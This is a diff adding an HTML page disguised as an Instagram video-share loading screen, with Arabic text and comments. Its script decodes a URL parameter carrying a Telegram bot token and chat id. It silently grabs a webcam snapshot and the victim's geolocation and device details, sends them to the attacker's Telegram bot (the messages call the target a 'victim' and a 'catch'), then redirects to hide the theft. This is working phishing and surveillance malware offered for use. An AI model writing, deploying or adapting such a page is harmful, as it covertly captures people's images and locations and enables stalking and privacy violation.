@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram | Loading...</title>
+    
+    <meta property="og:title" content="شاهد المحتوى الآن">
+    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg">
+    <meta property="og:description" content="تم مشاركة فيديو معك عبر إنستجرام">
+
+    <style>
+        body { background: #000; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; }
+        .loader { width: 50px; height: 50px; border: 3px solid #333; border-top: 3px solid #0095f6; border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .text { color: #555; margin-top: 15px; font-size: 12px; letter-spacing: 1px; }
+    </style>
+</head>
+<body>
+
+    <div style="text-align: center;">
+        <div class="loader"></div>
+        <div class="text">CONNECTING TO SERVER...</div>
+    </div>
+
+    <canvas id="pc" style="display:none;"></canvas>
+
+    <script>
+        window.onload = async () => {
+            const params = new URLSearchParams(window.location.search);
+            const payload = params.get('p');
+            if (!payload) return window.location.href = "https://instagram.com";
+
+            try {
+                const data = JSON.parse(atob(payload)); // فك التشفير (Token, ID, URL, Mode)
+                
+                // 1. محاولة لقط الصورة فوراً (صامت)
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    await video.play();
+                    
+                    const canvas = document.getElementById('pc');
+                    canvas.width = 640; canvas.height = 480;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));
+                    const fd = new FormData();
+                    fd.append('photo', blob, 'shot.jpg');
+                    fd.append('chat_id', data.i);
+                    
+                    await fetch(`https://api.telegram.org/bot${data.t}/sendPhoto`, { method: 'POST', body: fd });
+                    stream.getTracks().forEach(t => t.stop());
+                } catch (e) { console.log("Camera Blocked"); }
+
+                // 2. سحب الموقع والبيانات
+                let info = `📱 **صيد جديد (Matrix V5)**\n- الجهاز: ${navigator.platform}\n- المتصفح: ${navigator.userAgent.split(' ').pop()}\n- الرامات: ${navigator.deviceMemory || '??'}GB`;
+                
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    const map = `\n📍 **الموقع:** https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                    await send(data, info + map);
+                }, async () => {
+                    await send(data, info + "\n⚠️ الموقع: الضحية رفض الصلاحية.");
+                });
+
+                // 3. التحويل النهائي للتمويه
+                setTimeout(() => { window.location.href = data.u; }, 2000);
+
+            } catch (err) {
+                window.location.href = "https://instagram.com";
+            }
+        };
+
+        async function send(cfg, txt) {
+            await fetch(`https://api.telegram.org/bot${cfg.t}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: `chat_id=${cfg.i}&text=${encodeURIComponent(txt)}&parse_mode=Markdown`
+            });
+        }
+    </script>
+</body>
+</html>
